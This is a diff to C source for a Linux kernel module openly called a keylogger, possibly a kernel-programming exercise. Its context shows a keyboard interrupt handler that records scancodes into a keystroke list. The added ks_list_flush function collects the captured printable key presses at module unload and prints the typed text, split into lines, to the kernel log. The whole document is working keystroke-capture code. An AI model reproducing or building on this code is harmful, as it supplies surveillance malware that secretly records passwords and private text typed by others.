@@ -130,7 +130,7 @@ static void do_tasklet(unsigned long unused)
 		read_lock(&keyboard_rwlock);
 		packet = scan_array[rindex++];
 		read_unlock(&keyboard_rwlock);
-		/*printk(KERN_INFO "tasklet : [%x]\n", packet); */
+		/* printk(KERN_INFO "tasklet : [%x]\n", packet); */
 		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
 			target = windex;
 		scan_fsm_update(&scan_fsm, packet);
@@ -138,11 +138,6 @@ static void do_tasklet(unsigned long unused)
 			scan_fsm_send(&scan_fsm, &keystroke_list);
 		if (scan_fsm.state == ERROR || scan_fsm.state == SUCCESS)
 			scan_fsm_clear(&scan_fsm);
-		/* state machine
-		 *  if SUCCESS, format packet and& send it to buffer
-		 *  if ERROR, flush fsm
-		 */
-		
 	}
 }
 DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);
@@ -197,11 +192,47 @@ err:
 	return result;
 }
 
-static void __exit keylogger_cleanup(void)
+static void		ks_list_flush(void)
 {
+	struct list_head 	*pos;
 	struct keystroke	*ks = NULL;
 	struct keystroke 	*n = NULL;
 	ssize_t			size = 0;	
+	char			*buf = NULL;
+	char			*tokens;
+	char			*tmp;
+	char			*str;
+	
+	list_for_each(pos, &keystroke_list) {
+		size++;
+	}
+
+	if (!(buf = kmalloc(size + 1, GFP_KERNEL)))
+		goto err;
+	memset(buf, 0, size + 1);
+
+	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
+		if (ks->state == PRESSED && (ks->ascii >= 32 && ks->ascii <= 127))
+			strncat(buf, (char *)&ks->ascii, 1);
+		list_del(&ks->list);	
+		kfree(ks);
+	}
+
+	tmp = buf;
+	tokens = "\r";
+	while ((str = strsep(&buf, tokens)))
+		printk(KERN_INFO "%s\n", str);
+
+	printk(KERN_INFO "nbr of entries was %lu\n", size);
+
+	kfree(tmp);
+err:
+	return;
+
+}
+
+static void __exit 	keylogger_cleanup(void)
+{
 
 	misc_deregister(&keylogger_misc);
 /*	void driver_register(struct device_driver *drv) */
@@ -209,14 +240,9 @@ static void __exit keylogger_cleanup(void)
 	free_irq(KEYBOARD_IRQ, id);
 
 	/* free list */
-	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
-		list_del(&ks->list);	
-		kfree(ks);
-		size++;
-	}
+	ks_list_flush();
 
-	/* free misc buffer */
-	printk(KERN_INFO "nbr of entries was %lu\n", size);
+	/* free klg_buffer ? */
 	printk(KERN_INFO "keylogger module : deregister\n");
 }
 
